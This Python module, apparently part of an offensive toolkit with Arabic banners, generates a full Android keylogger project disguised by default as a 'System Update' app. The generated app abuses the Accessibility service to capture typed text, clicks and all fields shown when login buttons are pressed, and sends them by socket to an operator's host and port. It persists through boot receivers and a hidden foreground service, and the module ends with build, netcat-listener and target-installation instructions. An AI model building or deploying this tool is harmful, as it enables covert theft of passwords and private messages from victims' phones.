#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Camorro Accessibility Hijack v3.0
APK يستغل خدمة Accessibility في أندرويد لتسجيل كل شيء
ويلتقط كلمات السر والرسائل بدون صلاحيات root
"""

import os
import textwrap
from core.utils import print_status, pause, input_target, save_result
from core.colors import bcolors

class AccessibilityHijack:
    def __init__(self):
        self.lhost = None
        self.lport = None
        self.app_name = None
        self.package_name = None

    def generate_apk_source(self):
        """Generate full Android project source code"""
        project_dir = f"camorro_accessibility_{self.package_name}"
        src_dir = f"{project_dir}/app/src/main/java/com/{self.package_name}/"
        res_dir = f"{project_dir}/app/src/main/res/"
        
        os.makedirs(src_dir, exist_ok=True)
        os.makedirs(f"{res_dir}/xml", exist_ok=True)
        os.makedirs(f"{res_dir}/values", exist_ok=True)
        
        # ---- AndroidManifest.xml ----
        manifest = f'''<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.{self.package_name}">
    
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.SYSTEM_ALERT_WINDOW"/>
    <uses-permission android:name="android.permission.FOREGROUND_SERVICE"/>
    <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED"/>
    <uses-permission android:name="android.permission.QUERY_ALL_PACKAGES"/>
    <uses-permission android:name="android.permission.BIND_ACCESSIBILITY_SERVICE"/>
    
    <application
        android:allowBackup="true"
        android:icon="@mipmap/ic_launcher"
        android:label="{self.app_name}"
        android:supportsRtl="true"
        android:theme="@style/Theme.CamorroAccessibility">
        
        <activity
            android:name=".MainActivity"
            android:exported="true"
            android:launchMode="singleTop">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        
        <service
            android:name=".KeyloggerService"
            android:exported="true"
            android:permission="android.permission.BIND_ACCESSIBILITY_SERVICE">
            <intent-filter>
                <action android:name="android.accessibilityservice.AccessibilityService"/>
            </intent-filter>
            <meta-data
                android:name="android.accessibilityservice"
                android:resource="@xml/accessibility_service_config"/>
        </service>
        
        <service
            android:name=".BackgroundService"
            android:enabled="true"
            android:exported="true"
            android:foregroundServiceType="dataSync"/>
        
        <receiver
            android:name=".BootReceiver"
            android:enabled="true"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.BOOT_COMPLETED"/>
                <action android:name="android.intent.action.USER_PRESENT"/>
            </intent-filter>
        </receiver>
        
    </application>
</manifest>
'''
        
        with open(f"{project_dir}/app/src/main/AndroidManifest.xml", "w") as f:
            f.write(manifest)
        
        # ---- MainActivity.java ----
        main_activity = f'''package com.{self.package_name};

import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.widget.Toast;
import androidx.appcompat.app.AppCompatActivity;

public class MainActivity extends AppCompatActivity {{
    @Override
    protected void onCreate(Bundle savedInstanceState) {{
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        
        // Start background service immediately
        Intent bgService = new Intent(this, BackgroundService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            startForegroundService(bgService);
        }} else {{
            startService(bgService);
        }}
        
        // Guide user to enable Accessibility
        if (!isAccessibilityServiceEnabled()) {{
            Toast.makeText(this, "Please enable Accessibility for better experience", Toast.LENGTH_LONG).show();
            Intent intent = new Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS);
            startActivity(intent);
        }}
        
        // Close main activity (hide icon from recents)
        moveTaskToBack(true);
        finish();
    }}
    
    private boolean isAccessibilityServiceEnabled() {{
        String service = getPackageName() + "/.KeyloggerService";
        try {{
            String enabledServices = Settings.Secure.getString(
                getContentResolver(),
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            );
            if (enabledServices != null) {{
                return enabledServices.contains(service);
            }}
        }} catch (Exception e) {{
            // Ignore
        }}
        return false;
    }}
}}
'''
        with open(f"{src_dir}/MainActivity.java", "w") as f:
            f.write(main_activity)
        
        # ---- KeyloggerService.java ----
        keylogger = f'''package com.{self.package_name};

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Intent;
import android.os.Build;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.io.DataOutputStream;
import java.io.OutputStream;
import java.net.Socket;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Queue;
import java.util.concurrent.ConcurrentLinkedQueue;

public class KeyloggerService extends AccessibilityService {{
    private static final String TAG = "CamorroKeylogger";
    private String serverHost = "{self.lhost}";
    private int serverPort = {self.lport};
    private Queue<String> logQueue = new ConcurrentLinkedQueue<>();
    private Handler handler = new Handler(Looper.getMainLooper());
    private StringBuilder currentText = new StringBuilder();
    private String lastPackage = "";
    private boolean connected = false;
    private Socket socket;
    private DataOutputStream dos;
    
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {{
        try {{
            String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";
            String className = event.getClassName() != null ? event.getClassName().toString() : "";
            
            AccessibilityNodeInfo source = event.getSource();
            
            switch (event.getEventType()) {{
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    if (source != null && source.getText() != null) {{
                        String text = source.getText().toString();
                        if (!text.isEmpty()) {{
                            String log = String.format("[%s] [%s] TEXT: %s",
                                getTimestamp(), packageName, text);
                            sendLog(log);
                        }}
                    }}
                    break;
                    
                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    if (source != null) {{
                        String viewId = source.getViewIdResourceName() != null ? 
                            source.getViewIdResourceName() : "unknown";
                        String log = String.format("[%s] [%s] CLICK: %s",
                            getTimestamp(), packageName, viewId);
                        sendLog(log);
                        
                        // Check for submit/login buttons - capture all fields
                        if (source.getText() != null) {{
                            String btnText = source.getText().toString().toLowerCase();
                            if (btnText.contains("login") || btnText.contains("sign") || 
                                btnText.contains("submit") || btnText.contains("send")) {{
                                captureAllText(packageName);
                            }}
                        }}
                    }}
                    break;
                    
                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    if (!packageName.equals(lastPackage)) {{
                        lastPackage = packageName;
                        String log = String.format("[%s] APP: %s",
                            getTimestamp(), packageName);
                        sendLog(log);
                    }}
                    break;
                    
                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    if (source != null && source.getText() != null) {{
                        currentText = new StringBuilder(source.getText().toString());
                    }}
                    break;
            }}
            
            if (source != null) {{
                source.recycle();
            }}
            
        }} catch (Exception e) {{
            Log.e(TAG, "Error processing event: " + e.getMessage());
        }}
    }}
    
    private void captureAllText(String packageName) {{
        try {{
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root != null) {{
                captureNodeRecursive(root, packageName);
                root.recycle();
            }}
        }} catch (Exception e) {{
            // Ignore
        }}
    }}
    
    private void captureNodeRecursive(AccessibilityNodeInfo node, String packageName) {{
        if (node == null) return;
        
        if (node.getText() != null && !node.getText().toString().isEmpty()) {{
            String log = String.format("[%s] [%s] FIELD: %s",
                getTimestamp(), packageName, node.getText().toString());
            sendLog(log);
        }}
        
        if (node.getContentDescription() != null) {{
            String log = String.format("[%s] [%s] DESC: %s",
                getTimestamp(), packageName, node.getContentDescription().toString());
            sendLog(log);
        }}
        
        for (int i = 0; i < node.getChildCount(); i++) {{
            captureNodeRecursive(node.getChild(i), packageName);
        }}
    }}
    
    @Override
    public void onInterrupt() {{
        Log.d(TAG, "Accessibility service interrupted");
    }}
    
    @Override
    public void onServiceConnected() {{
        super.onServiceConnected();
        
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.flags = AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS |
                     AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS |
                     AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS;
        info.notificationTimeout = 100;
        
        setServiceInfo(info);
        
        // Start connection thread
        new Thread(this::connectToServer).start();
        
        Log.d(TAG, "Accessibility service connected and configured");
    }}
    
    private void connectToServer() {{
        int retries = 0;
        while (retries < 100) {{
            try {{
                socket = new Socket(serverHost, serverPort);
                dos = new DataOutputStream(socket.getOutputStream());
                connected = true;
                
                sendLog("[CONNECTED] Camorro Accessibility Keylogger online");
                
                // Send queued logs
                while (!logQueue.isEmpty()) {{
                    String log = logQueue.poll();
                    if (log != null) {{
                        dos.writeUTF(log);
                        dos.flush();
                    }}
                }}
                
                // Keep alive
                while (connected) {{
                    try {{
                        Thread.sleep(1000);
                        dos.writeUTF("[HEARTBEAT]");
                        dos.flush();
                    }} catch (Exception e) {{
                        connected = false;
                        break;
                    }}
                }}
                
            }} catch (Exception e) {{
                connected = false;
                retries++;
                try {{ Thread.sleep(5000); }} catch (Exception ex) {{}}
            }}
        }}
    }}
    
    private void sendLog(String log) {{
        if (connected && dos != null) {{
            try {{
                dos.writeUTF(log);
                dos.flush();
            }} catch (Exception e) {{
                connected = false;
                logQueue.add(log);
            }}
        }} else {{
            logQueue.add(log);
        }}
    }}
    
    private String getTimestamp() {{
        return new SimpleDateFormat("yyyy-MM-dd HH:mm:ss.SSS", Locale.US).format(new Date());
    }}
}}
'''
        with open(f"{src_dir}/KeyloggerService.java", "w") as f:
            f.write(keylogger)
        
        # ---- BackgroundService.java ----
        bg_service = f'''package com.{self.package_name};

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import androidx.core.app.NotificationCompat;

public class BackgroundService extends Service {{
    private static final String CHANNEL_ID = "CamorroChannel";
    private static final int NOTIF_ID = 1337;
    
    @Override
    public void onCreate() {{
        super.onCreate();
        createNotificationChannel();
        startForeground(NOTIF_ID, getNotification());
    }}
    
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {{
        return START_STICKY;
    }}
    
    @Override
    public IBinder onBind(Intent intent) {{
        return null;
    }}
    
    private void createNotificationChannel() {{
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
            NotificationChannel channel = new NotificationChannel(
                CHANNEL_ID,
                "Background Service",
                NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {{
                manager.createNotificationChannel(channel);
            }}
        }}
    }}
    
    private Notification getNotification() {{
        return new NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("{self.app_name}")
            .setContentText("Running")
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setOngoing(true)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .build();
    }}
}}
'''
        with open(f"{src_dir}/BackgroundService.java", "w") as f:
            f.write(bg_service)
        
        # ---- BootReceiver.java ----
        boot_receiver = f'''package com.{self.package_name};

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

public class BootReceiver extends BroadcastReceiver {{
    @Override
    public void onReceive(Context context, Intent intent) {{
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) ||
            Intent.ACTION_USER_PRESENT.equals(intent.getAction())) {{
            Intent serviceIntent = new Intent(context, BackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {{
                context.startForegroundService(serviceIntent);
            }} else {{
                context.startService(serviceIntent);
            }}
        }}
    }}
}}
'''
        with open(f"{src_dir}/BootReceiver.java", "w") as f:
            f.write(boot_receiver)
        
        # ---- XML config files ----
        acc_config = '''<?xml version="1.0" encoding="utf-8"?>
<accessibility-service xmlns:android="http://schemas.android.com/apk/res/android"
    android:accessibilityEventTypes="typeAllMask"
    android:accessibilityFeedbackType="feedbackGeneric"
    android:accessibilityFlags="flagRetrieveInteractiveWindows|flagReportViewIds|flagIncludeNotImportantViews"
    android:canRetrieveWindowContent="true"
    android:description="@string/acc_service_description"
    android:notificationTimeout="100" />
'''
        with open(f"{res_dir}/xml/accessibility_service_config.xml", "w") as f:
            f.write(acc_config)
        
        # ---- strings.xml ----
        strings = f'''<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="app_name">{self.app_name}</string>
    <string name="acc_service_description">This service helps provide enhanced features</string>
</resources>
'''
        with open(f"{res_dir}/values/strings.xml", "w") as f:
            f.write(strings)
        
        # ---- activity_main.xml ----
        layout = '''<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
    android:layout_width="match_parent"
    android:layout_height="match_parent"
    android:orientation="vertical"
    android:gravity="center">
    <TextView
        android:layout_width="wrap_content"
        android:layout_height="wrap_content"
        android:text="Loading..."
        android:textSize="18sp"/>
</LinearLayout>
'''
        os.makedirs(f"{project_dir}/app/src/main/res/layout", exist_ok=True)
        with open(f"{project_dir}/app/src/main/res/layout/activity_main.xml", "w") as f:
            f.write(layout)

        # ---- build.gradle ----
        gradle = '''apply plugin: 'com.android.application'
android {
    compileSdk 33
    defaultConfig {
        minSdk 21
        targetSdk 33
    }
    buildTypes {
        release {
            minifyEnabled false
        }
    }
}
dependencies {
    implementation 'androidx.appcompat:appcompat:1.6.1'
    implementation 'androidx.core:core:1.10.1'
}
'''
        with open(f"{project_dir}/app/build.gradle", "w") as f:
            f.write(gradle)
        
        # ---- build script ----
        build_sh = f'''#!/bin/bash
# Build Camorro Accessibility APK
cd {project_dir}
# Ensure gradle wrapper
if [ ! -f gradlew ]; then
    gradle wrapper --gradle-version 8.0
fi
chmod +x gradlew
./gradlew assembleRelease
cp app/build/outputs/apk/release/app-release.apk ../../output/accessibility_hijack.apk
echo "[+] APK generated: output/accessibility_hijack.apk"
'''
        with open(f"{project_dir}/build.sh", "w") as f:
            f.write(build_sh)
        os.chmod(f"{project_dir}/build.sh", 0o755)

        print_status(f"Android project created at {project_dir}/", "ok")
        return project_dir

    def run(self, target=None):
        print(f"""
{bcolors.CYAN}╔══════════════════════════════════════════════════════════╗
║    CAMORRO ACCESSIBILITY HIJACK — KEYLOGGER PRO        ║
║   APK بتستغل Accessibility Service عشان تسجل كل حاجة    ║
║   كلمات السر، رسائل، تطبيقات، نقرات — بدون Root         ║
╚══════════════════════════════════════════════════════════╝{bcolors.ENDC}
        """)
        
        self.lhost = input_target("Your IP (LHOST)")
        self.lport = input("LPORT [5555]: ").strip() or "5555"
        self.app_name = input("App name [System Update]: ").strip() or "System Update"
        self.package_name = input("Package [systemupdate]: ").strip() or "systemupdate"
        
        print_status("Generating Android project...", "info")
        project_dir = self.generate_apk_source()
        
        print(f"""
{bcolors.GREEN}╔══════════════════════════════════════════════════════════╗
║  ✅ ACCESSIBILITY HIJACK PROJECT READY!                ║
║                                                         ║
║  📁 Project: {project_dir}            ║
║  🎯 Callback: {self.lhost}:{self.lport}                         ║
║  📱 App name: {self.app_name}                                    ║
║                                                         ║
║  ▶️  Build APK:                                           ║
║     cd {project_dir} && bash build.sh  ║
║                                                         ║
║  ▶️  Start listener:                                     ║
║     nc -lvnp {self.lport}                                    ║
║                                                         ║
║  ▶️  بعد تثبيت APK على الجهاز المستهدف:                   ║
║     1- افتح التطبيق مرة واحدة (يطلب تمكين Accessibility) ║
║     2- اذهب إلى الإعدادات → Accessibility               ║
║     3- فعّل {self.app_name}                                ║
║     4- كل النقرات والنصوص تصل عندك الآن 🎯              ║
╚══════════════════════════════════════════════════════════╝{bcolors.ENDC}
        """)
        
        save_result(
            f"logs/accessibility_hijack.txt",
            f"Project: {project_dir}\nLHOST: {self.lhost}:{self.lport}\nApp: {self.app_name}"
        )
        
        pause()

if __name__ == "__main__":
    AccessibilityHijack().run()
